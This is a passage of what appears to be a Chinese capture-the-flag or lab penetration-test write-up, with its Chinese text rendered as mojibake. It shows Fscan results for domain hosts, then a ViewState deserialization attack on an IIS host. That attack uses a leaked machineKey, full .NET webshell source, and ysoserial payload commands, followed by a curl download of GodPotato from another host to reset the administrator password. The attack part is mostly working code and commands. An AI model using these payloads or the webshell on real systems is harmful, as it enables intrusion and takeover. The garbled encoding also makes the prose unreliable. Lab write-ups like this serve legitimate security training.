â”‚ / /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>     â”‚
â”‚ <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: <span class="token number">2.0</span>.1

<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="token number">1</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¸»æœºæ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: <span class="token number">65535</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:445
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:135
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:139
<span class="token punctuation">[</span><span class="token number">8</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:3389
<span class="token punctuation">[</span><span class="token number">12</span>.1s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:5985
<span class="token punctuation">[</span><span class="token number">43</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:47001
<span class="token punctuation">[</span><span class="token number">45</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49664
<span class="token punctuation">[</span><span class="token number">45</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49665
<span class="token punctuation">[</span><span class="token number">45</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49666
<span class="token punctuation">[</span><span class="token number">45</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49667
<span class="token punctuation">[</span><span class="token number">45</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49668
<span class="token punctuation">[</span><span class="token number">45</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49672
<span class="token punctuation">[</span><span class="token number">45</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49671
<span class="token punctuation">[</span><span class="token number">45</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49673
<span class="token punctuation">[</span><span class="token number">45</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49670
<span class="token punctuation">[</span><span class="token number">45</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.32:49747
<span class="token punctuation">[</span><span class="token number">55</span>.2s<span class="token punctuation">]</span>     æ‰«æå®Œæˆ, å‘ç° <span class="token number">16</span> ä¸ªå¼€æ”¾ç«¯å£
<span class="token punctuation">[</span><span class="token number">55</span>.2s<span class="token punctuation">]</span>     å­˜æ´»ç«¯å£æ•°é‡: <span class="token number">16</span>
<span class="token punctuation">[</span><span class="token number">55</span>.2s<span class="token punctuation">]</span>     å¼€å§‹æ¼æ´æ‰«æ
<span class="token punctuation">[</span><span class="token number">55</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.20.32    FPCORP<span class="token punctuation">\</span>FPSRVFS02              
<span class="token punctuation">[</span><span class="token number">55</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: <span class="token number">172.22</span>.20.32
ä¸»æœºå: FPSRVFS02
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ <span class="token number">172.22</span>.20.32
<span class="token punctuation">[</span>1m18s<span class="token punctuation">]</span>     æ‰«æå·²å®Œæˆ: <span class="token number">7</span>/7</code></pre>

<p>FPSRVAD01ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Ollama:~<span class="token comment"># ./FScan_2.0.1_linux_x64 -h 172.22.20.25 -p 1-65535</span>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __    â”‚
â”‚  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /    â”‚
â”‚ / /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>     â”‚
â”‚ <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: <span class="token number">2.0</span>.1

<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="token number">1</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¸»æœºæ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: <span class="token number">65535</span>
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:88
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:464
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:445
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:53
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:593
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:139
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:135
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:636
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:389
<span class="token punctuation">[</span><span class="token number">7</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:3268
<span class="token punctuation">[</span><span class="token number">7</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:3269
<span class="token punctuation">[</span><span class="token number">7</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:3389
<span class="token punctuation">[</span><span class="token number">12</span>.1s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:5985
<span class="token punctuation">[</span><span class="token number">12</span>.1s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:5987
<span class="token punctuation">[</span><span class="token number">16</span>.1s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:9389
<span class="token punctuation">[</span><span class="token number">43</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:47001
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49664
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49665
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49666
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49667
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49668
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49670
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49674
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49677
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49678
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49681
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49687
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49703
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:49761
<span class="token punctuation">[</span><span class="token number">45</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.25:50245
<span class="token punctuation">[</span><span class="token number">54</span>.9s<span class="token punctuation">]</span>     æ‰«æå®Œæˆ, å‘ç° <span class="token number">30</span> ä¸ªå¼€æ”¾ç«¯å£
<span class="token punctuation">[</span><span class="token number">54</span>.9s<span class="token punctuation">]</span>     å­˜æ´»ç«¯å£æ•°é‡: <span class="token number">30</span>
<span class="token punctuation">[</span><span class="token number">54</span>.9s<span class="token punctuation">]</span>     å¼€å§‹æ¼æ´æ‰«æ
<span class="token punctuation">[</span><span class="token number">55</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: <span class="token number">172.22</span>.20.25
ä¸»æœºå: FPSRVAD01
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ <span class="token number">172.22</span>.20.25
<span class="token punctuation">[</span><span class="token number">55</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.20.25    DC:FPCORP<span class="token punctuation">\</span>FPSRVAD01        
<span class="token punctuation">[</span><span class="token number">55</span>.0s<span class="token punctuation">]</span>     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª
<span class="token punctuation">[</span>3m52s<span class="token punctuation">]</span>     æ‰«æå·²å®Œæˆ: <span class="token number">11</span>/11</code></pre>

<h3 id="5-FPSRVIIS03"><a href="#5-FPSRVIIS03" class="headerlink" title="5. FPSRVIIS03"></a>5. FPSRVIIS03</h3><pre class="language-none"><code class="language-none">172.22.20.38:21 åŒ¿åç™»å½• FTP
172.22.20.38:8080 IntraFetch Web</code></pre>

<p>åŒ¿åç™»å½•è¯» FTP èµ„æºï¼Œ<span class="hexo-wm">sâ€ŒğŸ¯vğï½âˆ™â€Œğ¬â…ˆâ€‹ğ­ğ˜¦â€Œ</span>å¾—åˆ°ä¸€ä¸ª .Net é¡¹ç›® IntraFetch çš„æºç </p>
<p>åˆ†æé¡¹ç›®æºç å‘ç°é¡¹ç›®å­˜åœ¨ ViewState ååºåˆ—åŒ–æ¼æ´ï¼Œ<span class="hexo-wm">ğ’”ï»¿3ğ’—â„®ğ˜¯â€¢â€â€‹ğ¬ğ˜ªï»¿ğ˜µğâ€‹â€Œ</span>ä»é¡¹ç›®æºç ä¸­è·å–è§£å¯†åŠæ ¡éªŒçš„ç®—æ³•å’Œå¯†é’¥ï¼š</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token operator">&lt;</span><span class="token class-name">machineKey</span> decryption<span class="token operator">=</span><span class="token string">"AES"</span> decryptionKey<span class="token operator">=</span><span class="token string">"6424A8B2C8CE51FEFECBDBE795A8F33EBD81234CB655F610EEC49CFA13F89CC1"</span> validation<span class="token operator">=</span><span class="token string">"SHA1"</span> validationKey<span class="token operator">=</span><span class="token string">"1B7E26950A9C9ABFE4FE72FF25649D4DC4CA6286F3943D3ABB1B70AC6D81142D000CC3880E137C49954EF6284980381A2C674F785C13C960BDE13CB2595873FD"</span><span class="token operator">/</span><span class="token operator">&gt;</span></code></pre>

<p>ç¼–å†™ä¸€ä¸ª .NET <span class="hexo-wm">ğ˜€â€Œâ‘¶â…´ğğ˜¯â€¢â€Œğ’”iâ€â€ğ’•eâ€Œâ€Œ</span>Webshellï¼š</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">class</span> <span class="token class-name">E</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token class-name">System<span class="token punctuation">.</span>Web<span class="token punctuation">.</span>HttpContext</span> context <span class="token operator">=</span> System<span class="token punctuation">.</span>Web<span class="token punctuation">.</span>HttpContext<span class="token punctuation">.</span>Current<span class="token punctuation">;</span>
        context<span class="token punctuation">.</span>Server<span class="token punctuation">.</span><span class="token function">ClearError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        context<span class="token punctuation">.</span>Response<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span>
        <span class="token punctuation">{</span>
            <span class="token class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span> process <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"cmd.exe"</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">string</span></span> cmd <span class="token operator">=</span> context<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Form<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>Arguments <span class="token operator">=</span> <span class="token string">"/c "</span> <span class="token operator">+</span> cmd<span class="token punctuation">;</span>
            process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardError <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            process<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">string</span></span> output <span class="token operator">=</span> process<span class="token punctuation">.</span>StandardOutput<span class="token punctuation">.</span><span class="token function">ReadToEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            context<span class="token punctuation">.</span>Response<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>Exception</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
        context<span class="token punctuation">.</span>Response<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        context<span class="token punctuation">.</span>Response<span class="token punctuation">.</span><span class="token function">End</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>

<p>æ‰¾ä¸€ä¸ªåŒ…å« ViewState çš„é¡µé¢ <code>Default.aspx</code>ï¼ˆåŒ…å« <code>runat="server"</code>ï¼‰ï¼Œä½¿ç”¨ ysoserial <span class="hexo-wm">ğ˜€â€3â…´ğï½Â·â€â€‹ğ’”iâ€‹â€‹ğ˜µğï»¿</span>æ„é€  Payloadï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ysoserial.exe <span class="token parameter variable">-p</span> ViewState <span class="token parameter variable">-g</span> ActivitySurrogateDisableTypeCheck <span class="token parameter variable">-c</span> <span class="token string">"ignore"</span> <span class="token parameter variable">--path</span><span class="token operator">=</span><span class="token string">"/Default.aspx"</span> <span class="token parameter variable">--apppath</span><span class="token operator">=</span><span class="token string">"/"</span> <span class="token parameter variable">--decryptionalg</span><span class="token operator">=</span><span class="token string">"AES"</span> <span class="token parameter variable">--decryptionkey</span><span class="token operator">=</span><span class="token string">"6424A8B2C8CE51FEFECBDBE795A8F33EBD81234CB655F610EEC49CFA13F89CC1"</span> <span class="token parameter variable">--validationalg</span><span class="token operator">=</span><span class="token string">"SHA1"</span> <span class="token parameter variable">--validationkey</span><span class="token operator">=</span><span class="token string">"1B7E26950A9C9ABFE4FE72FF25649D4DC4CA6286F3943D3ABB1B70AC6D81142D000CC3880E137C49954EF6284980381A2C674F785C13C960BDE13CB2595873FD"</span> <span class="token parameter variable">--viewstateuserkey</span><span class="token operator">=</span><span class="token string">"88527b0d1e5d48e7a527da4b1a9c41ff"</span> <span class="token parameter variable">--isdebug</span>

ysoserial.exe <span class="token parameter variable">-p</span> ViewState <span class="token parameter variable">-g</span> ActivitySurrogateSelectorFromFile <span class="token parameter variable">-c</span> <span class="token string">"ExploitClass2.cs;./System.dll;./System.Web.dll"</span> <span class="token parameter variable">--path</span><span class="token operator">=</span><span class="token string">"/Default.aspx"</span> <span class="token parameter variable">--apppath</span><span class="token operator">=</span><span class="token string">"/"</span> <span class="token parameter variable">--decryptionalg</span><span class="token operator">=</span><span class="token string">"AES"</span> <span class="token parameter variable">--decryptionkey</span><span class="token operator">=</span><span class="token string">"6424A8B2C8CE51FEFECBDBE795A8F33EBD81234CB655F610EEC49CFA13F89CC1"</span> <span class="token parameter variable">--validationalg</span><span class="token operator">=</span><span class="token string">"SHA1"</span> <span class="token parameter variable">--validationkey</span><span class="token operator">=</span><span class="token string">"1B7E26950A9C9ABFE4FE72FF25649D4DC4CA6286F3943D3ABB1B70AC6D81142D000CC3880E137C49954EF6284980381A2C674F785C13C960BDE13CB2595873FD"</span> <span class="token parameter variable">--viewstateuserkey</span><span class="token operator">=</span><span class="token string">"88527b0d1e5d48e7a527da4b1a9c41ff"</span> <span class="token parameter variable">--isdebug</span></code></pre>

<p>é€šè¿‡ POST æ–¹æ³•ä¼ å…¥ <code>__VIEWSTATE</code> å‚æ•°å³å¯RCEï¼Œå‘ç°æ²¡æœ‰æƒé™è¯» <span class="hexo-wm">ğ¬â€‹â€Â³â…´ğ˜¦nâ€¢â€‹ğ˜´iâ€Œğ˜µeâ€Œâ€</span>flagï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç‰¹æƒä¿¡æ¯ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span> /priv

ç‰¹æƒä¿¡æ¯
----------------------

ç‰¹æƒå                        æè¿°                 çŠ¶æ€  
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
SeAssignPrimaryTokenPrivilege æ›¿æ¢ä¸€ä¸ªè¿›ç¨‹çº§ä»¤ç‰Œ   å·²ç¦ç”¨
SeIncreaseQuotaPrivilege      ä¸ºè¿›ç¨‹è°ƒæ•´å†…å­˜é…é¢   å·²ç¦ç”¨
SeAuditPrivilege              ç”Ÿæˆå®‰å…¨å®¡æ ¸         å·²ç¦ç”¨
SeChangeNotifyPrivilege       ç»•è¿‡éå†æ£€æŸ¥         å·²å¯ç”¨
SeImpersonatePrivilege        èº«ä»½éªŒè¯åæ¨¡æ‹Ÿå®¢æˆ·ç«¯ å·²å¯ç”¨
SeCreateGlobalPrivilege       åˆ›å»ºå…¨å±€å¯¹è±¡         å·²å¯ç”¨
SeIncreaseWorkingSetPrivilege å¢åŠ è¿›ç¨‹å·¥ä½œé›†       å·²ç¦ç”¨</code></pre>

<p>æœ‰ ImpersonatePrivilege ç‰¹æƒï¼Œä½¿ç”¨ <span class="hexo-wm">Ñ•â€ï»¿â‘¶â…´ğnï¼ï»¿Ñ•ğ˜ªï»¿ğ’•eâ€‹â€‹</span>GodPotato ææƒ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://172.22.20.11:8083/GodPotato.exe <span class="token parameter variable">-o</span> C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>GodPotato.exe
C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>GodPotato.exe <span class="token parameter variable">-cmd</span> <span class="token string">"net user administrator qwer1234!"</span></code></pre>

<p>rdp ç™»å½•åå‘ç° <span class="hexo-wm">ğ¬â€ï»¿â‘¶ğ˜·ï½…ğ§âˆ™â€‹â€Œğ¬â…ˆâ€Œâ€ğ˜µğ˜¦â€</span>Administrator æ¡Œé¢æœ‰ä¸€ä¸ªé€šçŸ¥æ–‡æ¡£ï¼š<code>å…³äºæ›´æ–°Visual Studioçš„é€šçŸ¥_2025å¹´07æœˆ05æ—¥.docx</code><br><img src="image-13.png" alt="image-13.png"></p>
